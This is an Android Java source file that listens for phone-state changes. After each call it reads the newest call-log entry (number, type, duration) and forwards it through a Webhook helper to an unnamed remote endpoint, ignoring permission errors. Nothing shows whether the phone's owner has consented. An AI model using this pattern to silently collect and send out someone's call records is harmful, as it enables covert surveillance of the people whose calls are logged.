package com.sayeed.notifcollector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver {

    private static String lastState = "";

    @Override
    public void onReceive(Context context, Intent intent) {

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        if (state == null) return;

        if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)
                && !lastState.isEmpty()) {

            final PendingResult pendingResult = goAsync();

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                readLastCallLog(context);
                pendingResult.finish();
            }, 1000);
        }

        lastState = state;
    }

    private void readLastCallLog(Context context) {

        try {
            Cursor cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DURATION
                    },
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );

            if (cursor == null) return;

            if (cursor.moveToFirst()) {

                String number = cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                );

                int type = cursor.getInt(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                );

                long duration = cursor.getLong(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                );

                String typeStr;

                if (type == CallLog.Calls.MISSED_TYPE) {
                    typeStr = "Missed";
                } else if (type == CallLog.Calls.INCOMING_TYPE) {
                    typeStr = "Incoming";
                } else if (type == CallLog.Calls.OUTGOING_TYPE) {
                    typeStr = "Outgoing";
                } else {
                    typeStr = "Other";
                }

                Webhook.send(
                        context,
                        "PhoneCall",
                        typeStr + " Call",
                        "Number: " + number + ", Duration: " + duration + "s"
                );
            }

            cursor.close();

        } catch (SecurityException e) {
            // Permission not available
        }
    }
}
